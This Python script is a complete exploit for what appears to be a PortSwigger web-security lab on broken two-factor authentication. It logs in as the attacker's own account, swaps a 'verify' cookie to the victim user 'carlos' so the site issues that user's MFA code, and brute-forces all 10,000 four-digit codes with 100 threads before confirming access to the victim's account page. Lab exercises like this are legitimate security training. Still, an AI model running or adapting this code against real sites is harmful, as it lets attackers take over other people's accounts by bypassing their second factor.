import os
import requests
import urllib3
import time
import threading
import queue

# For an authorized PortSwigger lab only.
# Set LAB_URL, LAB_USERNAME, and LAB_PASSWORD in your environment.
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE_URL = os.environ.get("LAB_URL", "").rstrip("/")
LOGIN_PATH = "/login"
LOGIN2_PATH = "/login2"
ACCOUNT_PATH = "/my-account"

MY_USERNAME = os.environ.get("LAB_USERNAME", "wiener")
MY_PASSWORD = os.environ.get("LAB_PASSWORD", "")
VICTIM_USERNAME = "carlos"

THREADS = 100


def validate_config():
    if not BASE_URL.startswith("https://"):
        raise ValueError(
            "Set LAB_URL to your authorized HTTPS PortSwigger lab URL."
        )
    if not MY_PASSWORD:
        raise ValueError("Set LAB_PASSWORD before running the script.")


# STEP 1 — Log in and obtain the session cookie.
def login_as_self():
    print("Logging in to establish a session...")
    session = requests.Session()
    session.verify = False

    response = session.post(
        BASE_URL + LOGIN_PATH,
        data={"username": MY_USERNAME, "password": MY_PASSWORD},
        allow_redirects=False,
        timeout=10,
    )

    print(f"Login status: {response.status_code}")
    session_id = session.cookies.get("session")

    if response.status_code != 302 or not session_id:
        raise RuntimeError("Login failed. Check the lab URL and credentials.")

    return session_id


# STEP 2 — Trigger the MFA flow using explicit cookies.
def trigger_victim_code(session_id):
    print(f"Triggering the lab MFA flow for '{VICTIM_USERNAME}'...")
    cookies = {"session": session_id, "verify": VICTIM_USERNAME}

    response = requests.get(
        BASE_URL + LOGIN2_PATH,
        cookies=cookies,
        verify=False,
        allow_redirects=False,
        timeout=10,
    )

    print(f"/login2 status: {response.status_code}")


# STEP 3 — Test four-digit MFA codes with worker threads.
result = {"code": None}
result_lock = threading.Lock()
stop_flag = threading.Event()


def worker(session_id, code_queue):
    cookies = {"session": session_id, "verify": VICTIM_USERNAME}

    while not stop_flag.is_set():
        try:
            code = code_queue.get_nowait()
        except queue.Empty:
            return

        try:
            response = requests.post(
                BASE_URL + LOGIN2_PATH,
                data={"mfa-code": code},
                cookies=cookies,
                verify=False,
                allow_redirects=False,
                timeout=10,
            )
        except requests.RequestException:
            continue

        if response.status_code == 302:
            with result_lock:
                if result["code"] is None:
                    result["code"] = code
                    print(f"\nSuccess: MFA code accepted: {code}")
                    print(
                        "Redirect location:",
                        response.headers.get("Location"),
                    )
                    stop_flag.set()
            return


def brute_force_mfa_code(session_id):
    print(f"Starting four-digit code test ({THREADS} threads)...")
    start = time.time()

    code_queue = queue.Queue()
    for number in range(10000):
        code_queue.put(f"{number:04d}")

    threads = []
    for _ in range(THREADS):
        thread = threading.Thread(
            target=worker,
            args=(session_id, code_queue),
        )
        thread.start()
        threads.append(thread)

    total = 10000
    while any(thread.is_alive() for thread in threads):
        remaining = code_queue.qsize()
        completed = total - remaining
        elapsed = time.time() - start
        print(
            f"Progress: {completed}/{total} "
            f"elapsed={elapsed:.1f}s",
            end="\r",
        )
        time.sleep(1)

        if stop_flag.is_set():
            break

    for thread in threads:
        thread.join(timeout=5)

    print(f"\nCode testing finished in {time.time() - start:.1f}s")
    return result["code"]


# STEP 4 — Verify the lab account response.
def verify_access(session_id, code):
    cookies = {"session": session_id, "verify": VICTIM_USERNAME}

    response = requests.post(
        BASE_URL + LOGIN2_PATH,
        data={"mfa-code": code},
        cookies=cookies,
        verify=False,
        allow_redirects=False,
        timeout=10,
    )
    print(f"Final login status: {response.status_code}")

    account_response = requests.get(
        BASE_URL + ACCOUNT_PATH,
        cookies=cookies,
        verify=False,
        timeout=10,
    )
    print(f"/my-account status: {account_response.status_code}")

    if "carlos" in account_response.text.lower():
        print("Account content matched the lab verification check.")
    else:
        print("Could not confirm account access; check the lab manually.")


if __name__ == "__main__":
    validate_config()
    session_id = login_as_self()
    trigger_victim_code(session_id)
    found_code = brute_force_mfa_code(session_id)

    if found_code:
        verify_access(session_id, found_code)
    else:
        print("No valid code found. Check the lab setup and cookie flow.")
